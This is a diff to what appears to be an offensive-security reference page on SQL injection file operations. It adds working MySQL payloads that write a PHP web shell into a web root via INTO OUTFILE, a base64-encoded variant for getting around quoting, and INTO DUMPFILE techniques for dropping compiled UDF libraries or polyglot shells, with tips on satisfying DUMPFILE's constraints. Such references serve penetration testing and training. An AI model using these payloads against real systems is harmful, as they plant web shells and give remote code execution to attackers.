@@ -6,7 +6,7 @@ d3fend: [D3-MH, D3-EI, D3-FA]
 impact: [FileRead, FileWrite, RCE]
 owasp: [A05]
 sidebar:
-  order: 11
+  order: 12
   label: File operations
 ---
 import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
@@ -111,6 +111,21 @@ To write to a path with a known column count:
 
 ```sql
 ' UNION SELECT '<?php system($_GET[0]); ?>',2,3,4 INTO OUTFILE '/var/www/html/x.php'-- -
+```
+
+For binary content, or payloads whose quotes/newlines break the injection, wrap the data with `FROM_BASE64()` so only base64 characters travel in the query:
+
+```sql
+' UNION SELECT FROM_BASE64('PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4='),2,3,4 INTO OUTFILE '/var/www/html/x.php'-- -
+```
+
+For an exact binary (a compiled UDF `.so`, an image-polyglot shell), use `INTO DUMPFILE`, which writes bytes verbatim with no row or column formatting. Two constraints that bite if you just swap the keyword into the example above:
+
+- **DUMPFILE writes exactly one row.** The injected `UNION` row plus any rows the original query returns is more than one, which errors. Make the base query match nothing (inject a value with no results) and add `LIMIT 1`.
+- **It concatenates every selected column with no separator.** The `2,3,4` padding would become literal bytes in the file. Select the payload in one column and leave the rest empty (`''`), which contribute nothing.
+
+```sql
+nonexistent' UNION SELECT FROM_BASE64('<b64>'),'','','' LIMIT 1 INTO DUMPFILE '/tmp/x.so'-- -
 ```
 
 When the web root path is unknown, common locations:
